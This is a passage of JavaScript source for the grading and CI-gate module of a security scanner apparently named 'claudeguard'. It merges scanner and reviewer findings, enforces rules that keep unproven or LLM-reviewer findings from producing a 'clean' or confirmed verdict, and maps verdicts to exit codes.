  // THE KEYSTONE INVARIANT, stated on the axis it actually protects. Reviewer findings may never
  // move the CONFIRMED verdict, because a reviewer finding can never be confirmed. If this ever
  // fails, the cap has a hole and the whole "safe to let an LLM contribute" claim is void.
  if (summary.verdict.confirmedLevel !== graded.verdict.confirmedLevel ||
      summary.verdict.confirmedP0 !== graded.verdict.confirmedP0 ||
      summary.verdict.confirmedP1 !== graded.verdict.confirmedP1) {
    throw new Error('reviewer findings changed the confirmed verdict — the reviewer cap has a hole')
  }
  // LAW 4 makes the BADGE a function of coverage as well as confirmations, so a reviewer's P0/P1
  // judgement can move `clean` to `unknown` — and it should: an unsettled P1 from someone who read
  // the code is precisely a reason we cannot claim proven-safe. That is the only move allowed. It
  // is one-way (towards less certainty, never towards more), it can never reach a red badge, and
  // any other transition means the cap leaked.
  if (summary.verdict.level !== graded.verdict.level &&
      !(graded.verdict.level === 'clean' && summary.verdict.level === 'unknown')) {
    throw new Error(`reviewer findings moved the badge ${graded.verdict.level} -> ${summary.verdict.level}; ` +
      'the only transition a reviewer may cause is clean -> unknown')
  }

  return {
    ...graded,
    findings: merged,
    ...summary,
    // The run record travels with the result, so it must not keep attesting the pre-merge badge:
    // a reviewer's unsettled P1 can legitimately move `clean` to `unknown`, and a record that still
    // said `clean` beside a verdict that says `unknown` would be exactly the kind of quiet
    // inconsistency someone later cites as proof the tool cannot be trusted.
    runRecord: graded.runRecord
      ? { ...graded.runRecord, verdict: summary.verdict.level }
      : graded.runRecord,
    reviewer: {
      submitted: (reviewerFindings || []).length,
      accepted: accepted.length,
      rejected: rejected.length,
      unanchored: accepted.filter(f => f.unanchored).length,
    },
    rejected,
    reviewerNotes: notes,
  }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

/**
 * @param {object} model            output of project_model.mjs
 * @param {object} [opts]
 * @param {object[]} [opts.observations]  tier-tagged observations from live_probe / dast_runner
 * @param {object} [opts.scanners]        { secrets, sast, dependencies, dynamic, snyk } adapter outputs
 * @param {string[]} [opts.allowlist]     subject ids the user has accepted
 * @param {string} [opts.now]             caller-supplied timestamp for runRecord.generatedAt. The
 *                                        grader never reads a clock itself — see buildRunRecord.
 */
export function grade(model, opts = {}) {
  const ledger = new Ledger()
  const findings = []
  const allow = new Set(opts.allowlist || [])

  // parserVersion 1 matched inside SQL comments and could report RLS as enabled when it was off.
  // Grading that model would print a checkmark over a P0, so refuse rather than downgrade.
  const pv = model.database?.parserVersion ?? 0
  if ((model.database?.tables || []).length && pv < 2) {
    throw new Error(`Model was produced by an SQL parser older than version 2 (got ${pv}). ` +
      'Its RLS facts cannot be trusted. Re-run project_model.mjs.')
  }

  gradeEnvVars(model, ledger, findings, allow)
  gradeNextConfig(model, ledger, findings, allow)
  gradeTables(model, ledger, findings, allow)
  gradeSqlFunctions(model, ledger, findings, allow)
  gradeRoutes(model, ledger, findings, allow)
  gradeLlmSites(model, ledger, findings, allow)
  gradeSupabaseClients(model, ledger, findings, allow)
  gradeMobile(model, ledger, findings, allow)
  gradeCiWorkflows(model, ledger, findings, allow)
  gradeIac(model, ledger, findings, allow)
  gradeFirebaseRules(model, ledger, findings, allow)
  gradeObservations(opts.observations, ledger, findings)
  gradeScanners(opts.scanners, ledger, findings, allow)
  const businessLogic = gradeBusinessLogic(model, ledger, findings, allow, opts)
  // Runs LAST, on purpose: it declares what the rules above did not claim, so it must see the
  // finished picture rather than race the rules for a subject.
  declareUngradedSurfaces(model, ledger)

  // Three tools flagging one defect must print once, not three times. Runs after every rule and
  // adapter, because it can only reconcile what all of them have already produced.
  const reconciled = reconcileDuplicates(findings, ledger)

  // ---- law enforcement -----------------------------------------------------
  for (const f of reconciled) {
    if (f.confidence !== CONFIDENCE_BY_EVIDENCE[f.evidence.strength]) {
      throw new Error(`${f.id}: confidence must be a pure function of evidence`)
    }
    if (f.evidence.nameOnly && f.severity === 'P0') {
      throw new Error(`LAW 3 violated by ${f.id}`)
    }
    // THE EXTERNAL-ANALYSIS CEILING. `confirmed` drives the headline verdict and the auto-fix gate,
    // and it means "the compiler, the bundler or the file itself guarantees this". Snyk and semgrep
    // report an ANALYSIS — a judgement about code this grader did not read for itself — which is a
    // different kind of claim from gitleaks pointing at a credential's value on a line, and it is
    // capped accordingly. Asserted rather than merely intended, because the day someone adds a
    // `definitive` branch to one of these adapters is the day this tool starts turning badges red
    // on somebody else's opinion.
    if (JUDGEMENT_SOURCES.has(f.source) && f.confidence === 'confirmed') {
      throw new Error(`${f.id}: a finding from the external tool "${f.source}" resolved to confirmed. ` +
        'Only our own deterministic rules or a live proof-of-concept may reach confirmed.')
    }
  }
  const coverage = ledger.toJSON() // throws if LAW 2 is violated

  // LAW 1: no token-sensitive set may contain a `pass`. See NO_PASS_SETS.
  for (const setName of NO_PASS_SETS) {
    const passed = coverage[setName]?.pass || []
    if (passed.length) {
      throw new Error(`LAW 1: set "${setName}" recorded a pass (${passed[0].subject}). ` +
        'A token in the source is not proof — this subject must be undeterminable, not pass.')
    }
  }

  const sorted = sortFindings(reconciled)
  // The red badges count ONLY confirmed findings. Severity is uncapped precisely because this is
  // where uncertainty is paid for: an unproven P0 is reported, but it does not turn the badge
  // red. See CONTEXT.md, "Severity". LAW 4 completes the trade: not turning the badge red is not
  // the same as turning it GREEN, so `clean` also has to clear coverage and unproven P0/P1.
  const summary = summarize(sorted, model.discovery)

  // ---- LAW 4: a `clean` verdict may not be a lie ---------------------------
  // Asserted here, next to LAWs 1-3, rather than trusted from the code above. The failure this
  // prevents is silent by nature: a renderer or a future refactor that reintroduces "no confirmed
  // findings ⇒ green" produces a report that LOOKS like every other clean report, and the user
  // whose DELETE endpoint is wide open has no way to tell. So it throws instead.
  const v = summary.verdict
  if (v.level === 'clean') {
    if (v.unprovenP0 + v.unprovenP1 > 0) {
      throw new Error(`LAW 4: verdict "clean" with ${v.unprovenP0} unproven P0 and ${v.unprovenP1} ` +
        'unproven P1 still open. Nothing was proven wrong, but nothing was proven safe either — ' +
        'the level must be "unknown".')
    }
    if (!v.discoveryCoverage.adequate) {
      throw new Error('LAW 4: verdict "clean" on inadequate discovery coverage — ' +
        v.discoveryCoverage.reasons.join('; ') + '. The level must be "unknown".')
    }
  }
  // Defence in depth on the other side: `unknown` may only ever stand in for what used to be
  // `clean`. If something confirmed is present, the badge owes the user a severity.
  if (v.level === 'unknown' && v.confirmedLevel) {
    throw new Error(`LAW 4: verdict "unknown" with confirmed findings present (${v.confirmedLevel}). ` +
      '`unknown` replaces `clean`, never a graded level.')
  }
  if (!VERDICT_LEVELS.includes(v.level)) throw new Error(`unknown verdict level ${v.level}`)

  return {
    generatedBy: 'claudeguard/grader',
    ...summary,
    // A reproducible attestation of what produced this verdict. Deterministic by construction:
    // two runs on the same model differ only in `generatedAt`, and only when a caller passed one.
    runRecord: buildRunRecord(model, summary, opts),
    findings: sorted,
    coverage,
    // How much of what we enumerated we actually DECIDED, versus abstained on. Published beside
    // coverage because a full ledger of `undeterminable` rows is a complete accounting of nothing.
    decisionRate: decisionRateOf(coverage),
    // DISCOVERY coverage travels alongside analysis coverage, as its own axis: what the engine
    // could and could not SEE, versus how it graded what it saw. The renderer prints them as two
    // separate blocks so a partial scan cannot pass for a complete one. See ADR/methodology.
    discovery: model.discovery || null,
    // The business-logic tier's own accounting: whether the intent was CONFIRMED by the author or
    // assumed from column names, `rulesChecked / rulesTotal` per resource, and what was assumed
    // rather than established. A business-logic section with no coverage line is the same false
    // all-clear the rest of this tool exists to prevent — worse here, because these are the bugs a
    // scanner is expected to miss, so a confident silence is most dangerous exactly here.
    businessLogic: {
      status: businessLogic.status,
      error: businessLogic.error,
      columnsKnown: businessLogic.columnsKnown,
      resources: businessLogic.resources,
      assumptions: businessLogic.assumptions,
      // Printed verbatim so the user can paste it into claudeguard.intent.yml and correct it.
      proposedIntent: businessLogic.proposedYaml,
    },
    // Handed to the user verbatim when the schema could not be read, so they can answer the
    // question we could not.
    verifyQuery: model.database?.coverage?.verifyQuery || null,
    limits: model.limits || [],
  }
}

// ---- CLI --------------------------------------------------------------------

/**
 * Every flag that consumes the next argv element. Exported because `scripts/assert_cli_flags.mjs`
 * asserts each one is either exercised by a skill or explicitly declared CLI-only — grade-or-declare
 * turned inward, so a flag nobody ships and nobody documents cannot quietly rot here.
 */
export const CLI_FLAGS_TAKING_VALUE = new Set(['--model', '--observations', '--allowlist',
  '--scanners', '--secrets', '--sast', '--dependencies', '--dynamic', '--snyk', '--reviewer'])

/**
 * Flags that are deliberately NOT surfaced in any `plugin/skills/*\/SKILL.md`, each with its reason:
 *
 *   --gate            a CI / pre-deploy hook switch, not part of an interactive skill's flow.
 *   --model           documented in cg-scan's SKILL.md too; listed here because the CLI's own
 *                     stdin/path/model triad is plumbing, not a user-facing feature.
 *   --scanners        the combined-file convenience form of --secrets/--sast/--dependencies; the
 *                     skills teach the individual flags, which are clearer at a call site.
 *   --dynamic         DAST adapter output. `/cg-dast` hands its observations through
 *                     --observations; this arm exists for a pre-collected adapter payload.
 *   --snyk            the Snyk adapter's output. Documented in methodology/snyk-adapter.md; Snyk is
 *                     optional and absent for most of this audience, so no skill step assumes it.
 *   --propose-intent  business-logic intent scaffolding, taught in
 *   --check-intent    guard-recipes/business-logic-intent.md rather than in a skill step.
 *   --intent
 *
 * A flag NOT in this set and NOT named by a SKILL.md fails the build. Adding a name here is a
 * declaration on the record, which is the point: it costs a line of prose to keep a flag private.
 */
export const CLI_ONLY_FLAGS = new Set(['--gate', '--model', '--scanners', '--dynamic', '--snyk',
  '--propose-intent', '--check-intent', '--intent'])

/**
 * The gate's exit code, derived from the verdict and from nothing else.
 *
 * THE AGENT-DEPLOY STORY. This drops into a CI step or an agent's pre-deploy hook. Because a
 * reviewer finding can never reach `confirmed` (see mergeReviewerFindings) and `unknown` is what
 * LAW 4 emits when we could not prove safety, an agent cannot argue this gate green: the only way
 * to a 0 is better evidence in the repository.
 *
 *   1  proven bad      — a confirmed P0 or P1. The thing the tool exists to stop.
 *   2  not proven safe — `unknown`: an open unproven P0/P1, or discovery below the floor.
 *   0  otherwise       — `clean`, or only confirmed P2/P3/P4. Deploying is a judgement call here,
 *                        not a blocked one; gating on hygiene findings is how a gate gets disabled.
 */
export function gateExitCode(verdict) {
  if (verdict.confirmedP0 > 0 || verdict.confirmedP1 > 0) return 1
  if (verdict.level === 'unknown') return 2
  return 0
}

/** One line for a human reading CI logs. Never claims safety — it reports what was established. */
export function gateSummaryLine(result) {
  const v = result.verdict
  const dc = v.discoveryCoverage || {}
  const cov = dc.ratio == null ? 'no discovery ledger'
    : `discovery ${(100 * dc.ratio).toFixed(1)}% of ${dc.filesIntended} intended file(s), floor ${(100 * dc.floor).toFixed(0)}%`
  const why = v.level === 'unknown'
    ? ` — NOT PROVEN SAFE: ${v.unprovenP0} unproven P0, ${v.unprovenP1} unproven P1` +
      (dc.adequate ? '' : `; ${(dc.reasons || []).join('; ')}`)
    : v.level === 'clean' ? ' — nothing confirmed, no unproven P0/P1, coverage above floor'
      : ` — ${v.confirmedP0} confirmed P0, ${v.confirmedP1} confirmed P1`
  return `claudeguard --gate: ${String(v.level).toUpperCase()}${why} (${cov}; exit ${gateExitCode(v)})`
}

const isMain = process.argv[1] && resolve(process.argv[1]) === resolve(fileURLToPath(import.meta.url))
if (isMain) {
  // Parse in one pass. An earlier version searched the array with indexOf, which silently picked
  // the wrong element whenever a flag value repeated a positional argument.
  const argv = process.argv.slice(2)
  const flags = new Map()
  const positional = []
  const TAKES_VALUE = CLI_FLAGS_TAKING_VALUE
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i]
    if (TAKES_VALUE.has(a)) flags.set(a, argv[++i])
    else if (a.startsWith('--')) flags.set(a, true)
    else positional.push(a)
  }
  const flag = name => flags.get(name) ?? null
  const target = positional[0] || null
  const readJsonFlag = name => { const f = flag(name); return f ? JSON.parse(readFileSync(f, 'utf8')) : null }

  const readModel = () => {
    const modelFile = flag('--model')
    if (modelFile) return JSON.parse(readFileSync(modelFile, 'utf8'))
    if (target) {
      const engine = join(dirname(fileURLToPath(import.meta.url)), 'project_model.mjs')
      return JSON.parse(execFileSync(process.execPath, [engine, target], {
        encoding: 'utf8', maxBuffer: 64 * 1024 * 1024,
      }))
    }
    return JSON.parse(readFileSync(0, 'utf8'))
  }

  const obsFile = flag('--observations')
  const allowFile = flag('--allowlist')

  // Scanners can arrive as one combined file (`--scanners`, an object with secrets/sast/
  // dependencies keys) or as the three adapter outputs individually. The individual flags win, so
  // a caller can override one arm of a combined file.
  const combined = readJsonFlag('--scanners') || {}
  const scanners = {
    secrets: readJsonFlag('--secrets') || combined.secrets || null,
    sast: readJsonFlag('--sast') || combined.sast || null,
    dependencies: readJsonFlag('--dependencies') || combined.dependencies || null,
    dynamic: readJsonFlag('--dynamic') || combined.dynamic || null,
    snyk: readJsonFlag('--snyk') || combined.snyk || null,
  }
  const anyScanner = scanners.secrets || scanners.sast || scanners.dependencies ||
    scanners.dynamic || scanners.snyk

  let result = grade(readModel(), {
    observations: obsFile ? JSON.parse(readFileSync(obsFile, 'utf8')).observations : [],
    allowlist: allowFile ? JSON.parse(readFileSync(allowFile, 'utf8')).subjects : [],
    scanners: anyScanner ? scanners : null,
  })

  // Reviewer findings (auditor subagent output) are validated and merged AFTER grading, so the
  // laws are enforced on agent output exactly as on the rules. The file holds an array, or an
  // object with a `findings` array.
  const rev = readJsonFlag('--reviewer')
  if (rev) {
    const list = Array.isArray(rev) ? rev : (rev.findings || [])
    result = mergeReviewerFindings(result, list)
  }

  console.log(JSON.stringify(result, null, 2))

  // GATE MODE. The report still goes to stdout so the step composes; the human line and the exit
  // code go to stderr and to the process, where a CI runner and a pre-deploy hook can see them.
  if (flags.get('--gate')) {
    console.error(gateSummaryLine(result))
    process.exit(gateExitCode(result.verdict))
  }
}
